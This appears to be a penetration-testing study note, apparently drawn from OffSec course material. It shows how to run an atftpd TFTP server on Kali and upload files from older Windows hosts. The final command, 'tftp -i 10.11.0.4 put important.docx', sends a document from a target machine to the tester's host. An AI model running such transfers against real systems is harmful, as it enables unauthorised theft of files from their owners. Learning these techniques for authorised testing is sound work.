---
description: >-
  Uploading files using TFTP (older Windows Systems)
title: Uploading files using TFTP (older Windows Systems)              # Add title here
date: 2022-11-09 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Uploading files using TFTP (older Windows Systems)]                     # Change Templates to Writeup
tags: [file transfer, tftp upload]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
During a penetration test, we can use TFTP to transfer files from older Windows operating systems up to Windows XP and 2003. This is a terrific tool for non-interactive file transfer, but it is not installed by default on systems running Windows 7, Windows 2008, and newer.

For these reasons, TFTP is not an ideal file transfer protocol for most situations, but under the right circumstances, it has its advantages.

Before we learn how to transfer files with TFTP, we first need to install and configure a TFTP server in Kali and create a directory to store and serve files. Next, we update the ownership of the directory so we can write files to it. We will run atftpd as a daemon on UDP port 69 and direct it to use the newly created /tftp directory:

```bash
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

On the Windows system, we will run the tftp client with -i to specify a binary image transfer, the IP address of our Kali system, the put command to initiate an upload, and finally the filename of the file to upload.

The final command is similar to the one shown below in Listing 33:

```powershell
C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s
```

